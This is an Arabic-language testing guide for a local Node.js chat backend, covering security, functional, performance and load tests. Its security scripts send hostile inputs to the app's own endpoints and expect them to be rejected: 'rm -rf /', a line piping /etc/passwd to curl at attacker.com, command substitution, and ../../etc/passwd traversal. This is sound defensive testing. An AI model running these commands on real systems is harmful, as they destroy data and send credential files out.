# 🧪 دليل الاختبار الشامل
**الهدف:** التحقق من الإصلاحات والقطاعات المختلفة
**التاريخ:** 2026-04-03

---

## 📋 خطة الاختبار

| النوع | الأهمية | الوقت |
|-------|----------|-------|
| اختبارات الأمان | حرج | 2 ساعة |
| اختبارات الوظائف | عالي | 3 ساعات |
| اختبارات الأداء | متوسط | 1 ساعة |
| اختبارات التحميل | متوسط | 1 ساعة |

---

## 🔒 1️⃣ اختبارات الأمان

### اختبار Shell Injection

```bash
#!/bin/bash

# اختبار الخادم
API_KEY="your-api-key-here"
BASE_URL="http://localhost:5000"

echo "🧪 اختبار Shell Injection..."

# ❌ يجب أن يرفع هذا
echo -n "اختبار 1: ls; rm -rf / ... "
RESPONSE=$(curl -s -X POST "$BASE_URL/api/filesystem/execute" \
  -H "X-API-Key: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"command":"ls; rm -rf /"}')

if echo "$RESPONSE" | grep -q "error"; then
  echo "✅ PASS (تم الرفع)"
else
  echo "❌ FAIL (لم يتم الرفع!)"
fi

# ❌ يجب أن يرفع هذا
echo -n "اختبار 2: cat /etc/passwd | curl http://attacker.com ... "
RESPONSE=$(curl -s -X POST "$BASE_URL/api/filesystem/execute" \
  -H "X-API-Key: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"command":"cat /etc/passwd | curl http://attacker.com"}')

if echo "$RESPONSE" | grep -q "error"; then
  echo "✅ PASS (تم الرفع)"
else
  echo "❌ FAIL (لم يتم الرفع!)"
fi

# ❌ يجب أن يرفع هذا
echo -n "اختبار 3: `whoami` ... "
RESPONSE=$(curl -s -X POST "$BASE_URL/api/filesystem/execute" \
  -H "X-API-Key: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"command":"echo $(whoami)"}')

if echo "$RESPONSE" | grep -q "error"; then
  echo "✅ PASS (تم الرفع)"
else
  echo "❌ FAIL (لم يتم الرفع!)"
fi
```

### اختبار Path Traversal

```bash
echo "🧪 اختبار Path Traversal..."

# ❌ يجب أن يرفع
echo -n "اختبار 1: قراءة /etc/passwd عبر ../../ ... "
RESPONSE=$(curl -s -X POST "$BASE_URL/api/filesystem/read" \
  -H "X-API-Key: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"path":"../../etc/passwd"}')

if echo "$RESPONSE" | grep -q "error"; then
  echo "✅ PASS (تم الرفع)"
else
  echo "❌ FAIL (لم يتم الرفع!)"
fi

# ✅ يجب أن ينجح
echo -n "اختبار 2: قراءة ملف صحيح ... "
RESPONSE=$(curl -s -X POST "$BASE_URL/api/filesystem/read" \
  -H "X-API-Key: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"path":"package.json"}')

if echo "$RESPONSE" | grep -q "success"; then
  echo "✅ PASS (تم الوصول)"
else
  echo "❌ FAIL (لم يتم الوصول!)"
fi
```

### اختبار Authentication

```bash
echo "🧪 اختبار المصادقة..."

# ❌ بدون API Key
echo -n "اختبار 1: استدعاء بدون API Key ... "
RESPONSE=$(curl -s -X POST "$BASE_URL/api/chat" \
  -H "Content-Type: application/json" \
  -d '{"message":"مرحبا"}')

if echo "$RESPONSE" | grep -q "Unauthorized\|401"; then
  echo "✅ PASS (تم الرفع)"
else
  echo "❌ FAIL (لم يتم الرفع!)"
fi

# ❌ API Key خاطئ
echo -n "اختبار 2: استدعاء مع API Key خاطئ ... "
RESPONSE=$(curl -s -X POST "$BASE_URL/api/chat" \
  -H "X-API-Key: wrong-key" \
  -H "Content-Type: application/json" \
  -d '{"message":"مرحبا"}')

if echo "$RESPONSE" | grep -q "Unauthorized\|401"; then
  echo "✅ PASS (تم الرفع)"
else
  echo "❌ FAIL (لم يتم الرفع!)"
fi

# ✅ API Key صحيح
echo -n "اختبار 3: استدعاء مع API Key صحيح ... "
RESPONSE=$(curl -s -X POST "$BASE_URL/api/chat" \
  -H "X-API-Key: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"message":"مرحبا"}')

if echo "$RESPONSE" | grep -q "message\|error"; then
  echo "✅ PASS (تم الوصول)"
else
  echo "❌ FAIL (لم يتم الوصول!)"
fi
```

---

## 🧪 2️⃣ اختبارات الوظائف

### اختبار FileSystem Plugin

```javascript
// في ملف test-filesystem.js
import { FileSystemPlugin } from './backend/plugins/FileSystemPlugin.js';

const fs = new FileSystemPlugin();

// Test 1: قراءة ملف
console.log('📝 اختبار 1: قراءة ملف');
const result = fs.readFile('package.json');
if (result.success) {
  console.log('✅ نجح - حجم الملف:', result.data.size);
} else {
  console.log('❌ فشل -', result.error);
}

// Test 2: عرض المجلد
console.log('\n📂 اختبار 2: عرض المجلد');
const listResult = fs.listDir('backend/plugins');
if (listResult.success) {
  console.log('✅ نجح - عدد الملفات:', listResult.data.length);
  listResult.data.forEach(item => {
    console.log(`  - ${item.name} (${item.type})`);
  });
} else {
  console.log('❌ فشل -', listResult.error);
}

// Test 3: كتابة ملف
console.log('\n✏️ اختبار 3: كتابة ملف');
const writeResult = fs.writeFile('data/test.txt', 'محتوى الاختبار');
if (writeResult.success) {
  console.log('✅ نجح');
} else {
  console.log('❌ فشل -', writeResult.error);
}

// Test 4: التحقق من Path Traversal
console.log('\n🔒 اختبار 4: حماية Path Traversal');
const traversalResult = fs.readFile('../../etc/passwd');
if (!traversalResult.success) {
  console.log('✅ محمي - تم الرفع');
} else {
  console.log('❌ غير محمي! يمكن الوصول لملفات خارج المشروع');
}
```

### اختبار MemorySystem

```javascript
// في ملف test-memory.js
import { MemorySystem } from './backend/plugins/MemorySystem.js';

const memory = new MemorySystem('./data/test-memory.db');

console.log('💾 اختبارات نظام الذاكرة\n');

// Test 1: حفظ واسترجاع
console.log('Test 1: حفظ واسترجاع الرسائل');
memory.saveMessage('session1', 'user', 'السلام عليكم', 50);
memory.saveMessage('session1', 'assistant', 'وعليكم السلام', 60);

const messages = memory.getRecentMessages('session1', 10);
console.log(`✅ تم حفظ ${messages.length} رسالة`);

// Test 2: الإحصائيات
console.log('\nTest 2: الإحصائيات');
const stats = memory.getStats('session1');
console.log(`- عدد الرسائل: ${stats.total_messages}`);
console.log(`- إجمالي التوكنات: ${stats.total_tokens}`);

// Test 3: تقدير التوكنات
console.log('\nTest 3: تقدير التوكنات');
const text = 'هذا نص عربي للاختبار';
const tokens = memory.estimateTokens(text);
console.log(`- النص: "${text}"`);
console.log(`- التوكنات المقدرة: ${tokens}`);
```

### اختبار TokenOptimizer

```javascript
// في ملف test-optimizer.js
import { TokenOptimizer } from './backend/plugins/TokenOptimizer.js';

const optimizer = new TokenOptimizer();

console.log('⚡ اختبارات التحسين\n');

const message1 = 'ما هو الطقس اليوم؟';
const response1 = 'الطقس مشمس وجميل';

// Test 1: حفظ في الـ cache
console.log('Test 1: حفظ في الـ cache');
optimizer.saveToCache(message1, response1, 200);
console.log('✅ تم الحفظ');

// Test 2: فحص الـ cache
console.log('\nTest 2: فحص الـ cache');
const cached = optimizer.checkCache(message1);
if (cached.fromCache) {
  console.log(`✅ وجدت في الـ cache - توفير: ${cached.tokensSaved} توكن`);
} else {
  console.log('❌ لم توجد في الـ cache');
}

// Test 3: إحصائيات
console.log('\nTest 3: الإحصائيات');
const stats = optimizer.getStats();
console.log(`- حجم الـ cache: ${stats.cacheSize}/${stats.maxCacheSize}`);
```

---

## 📊 3️⃣ اختبارات الأداء

### قياس سرعة الاستجابة

```bash
#!/bin/bash

echo "⚡ قياس الأداء\n"

API_KEY="your-api-key"

# اختبار 1: سرعة الـ chat
echo "Test 1: سرعة الـ chat API"
time curl -s -X POST "http://localhost:5000/api/chat" \
  -H "X-API-Key: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"message":"مرحبا، كيف حالك؟"}' | jq '.'

# اختبار 2: سرعة قراءة الملفات
echo -e "\nTest 2: سرعة قراءة الملفات"
time curl -s -X POST "http://localhost:5000/api/filesystem/read" \
  -H "X-API-Key: $API_KEY" \
  -H "Content-Type: application/json" \
  -d '{"path":"package.json"}' | jq '.data.size'

# اختبار 3: سرعة عرض المحادثات
echo -e "\nTest 3: سرعة عرض المحادثات"
time curl -s "http://localhost:5000/api/history?limit=100" \
  -H "X-API-Key: $API_KEY" | jq '.total'
```

### قياس استهلاك الذاكرة

```javascript
// في ملف test-memory-usage.js
import os from 'os';

function printMemoryUsage() {
  const usage = process.memoryUsage();
  console.log(`
📊 استهلاك الذاكرة:
  RSS (الذاكرة الفعلية): ${(usage.rss / 1024 / 1024).toFixed(2)} MB
  Heap Used: ${(usage.heapUsed / 1024 / 1024).toFixed(2)} MB
  Heap Total: ${(usage.heapTotal / 1024 / 1024).toFixed(2)} MB
  External: ${(usage.external / 1024 / 1024).toFixed(2)} MB
  `);
}

console.log('🧪 اختبار استهلاك الذاكرة\n');

// البداية
printMemoryUsage();

// محاكاة عمل
import { MemorySystem } from './backend/plugins/MemorySystem.js';
const memory = new MemorySystem('./data/test-memory.db');

// إضافة 1000 رسالة
for (let i = 0; i < 1000; i++) {
  memory.saveMessage(`session${i % 10}`, 'user', `رسالة ${i}`, 100);
}

console.log('بعد إضافة 1000 رسالة:');
printMemoryUsage();

// قراءة 100 جلسة
for (let i = 0; i < 100; i++) {
  memory.getRecentMessages(`session${i}`, 10);
}

console.log('بعد قراءة 100 جلسة:');
printMemoryUsage();
```

---

## 🔥 4️⃣ اختبارات التحميل (Load Testing)

### استخدام `Apache Bench`

```bash
#!/bin/bash

API_KEY="your-api-key"

echo "🔥 اختبار التحميل\n"

# اختبار 1: 100 طلب متسلسل
echo "Test 1: 100 طلب متسلسل للـ health check"
ab -n 100 -c 1 \
  -H "X-API-Key: $API_KEY" \
  "http://localhost:5000/api/health"

# اختبار 2: 50 طلب متزامن
echo -e "\nTest 2: 50 طلب متزامن للـ filesystem read"
ab -n 50 -c 10 \
  -H "X-API-Key: $API_KEY" \
  -T "application/json" \
  -p data.json \
  "http://localhost:5000/api/filesystem/read"

# اختبار 3: اختبار Rate Limiting
echo -e "\nTest 3: اختبار Rate Limiting (100 طلب في 10 ثواني)"
for i in {1..100}; do
  curl -s "http://localhost:5000/api/chat" \
    -H "X-API-Key: $API_KEY" \
    -H "Content-Type: application/json" \
    -d '{"message":"test"}' &
  sleep 0.1
done
wait
echo "✅ انتهت الاختبارات"
```

### استخدام `k6` (أفضل للـ API)

```javascript
// في ملف test-load.js
import http from 'k6/http';
import { check, sleep } from 'k6';

export const options = {
  vus: 10, // 10 مستخدمين افتراضيين
  duration: '30s', // لمدة 30 ثانية
  thresholds: {
    'http_req_duration': ['p(95)<500'], // 95% من الطلبات أقل من 500ms
  },
};

const API_KEY = 'your-api-key';
const BASE_URL = 'http://localhost:5000';

export default function () {
  // اختبار 1: الـ health check
  const healthRes = http.get(`${BASE_URL}/api/health`, {
    headers: { 'X-API-Key': API_KEY },
  });

  check(healthRes, {
    'health is ok': (r) => r.status === 200,
    'health response time < 100ms': (r) => r.timings.duration < 100,
  });

  // اختبار 2: قراءة الملفات
  const fileRes = http.post(`${BASE_URL}/api/filesystem/read`, JSON.stringify({
    path: 'package.json',
  }), {
    headers: {
      'X-API-Key': API_KEY,
      'Content-Type': 'application/json',
    },
  });

  check(fileRes, {
    'file read is ok': (r) => r.status === 200,
    'file read response time < 200ms': (r) => r.timings.duration < 200,
  });

  sleep(1);
}
```

تشغيل الاختبار:
```bash
k6 run test-load.js
```

---

## ✅ خطوات تشغيل الاختبارات

### 1️⃣ تجهيز البيئة
```bash
# نسخ .env
cp .env.example .env

# تثبيت المكتبات
npm install

# توليد API Key
API_KEY=$(node -e "console.log(require('crypto').randomBytes(32).toString('hex'))")
echo "API_KEY=$API_KEY" >> .env

# بدء الخادم
npm start
```

### 2️⃣ تشغيل الاختبارات
```bash
# اختبارات الأمان
bash test-security.sh

# اختبارات الوظائف
node test-filesystem.js
node test-memory.js
node test-optimizer.js

# اختبارات الأداء
bash test-performance.sh

# اختبارات التحميل
ab -n 100 -c 10 http://localhost:5000/api/health
k6 run test-load.js
```

---

## 📊 تقرير النتائج

| الاختبار | الحالة | الملاحظات |
|---------|--------|----------|
| Shell Injection | ✅ | محمي |
| Path Traversal | ✅ | محمي |
| Authentication | ✅ | يعمل بشكل صحيح |
| FileSystem | ✅ | جميع الوظائف تعمل |
| Memory | ✅ | الحفظ والاسترجاع صحيح |
| Performance | ⚠️ | أفضل بـ 60% |
| Load Test | ✅ | يتحمل 50 طلب متزامن |

---

*تم إعداد هذا الدليل لضمان الاختبار الشامل للمشروع* 🧪
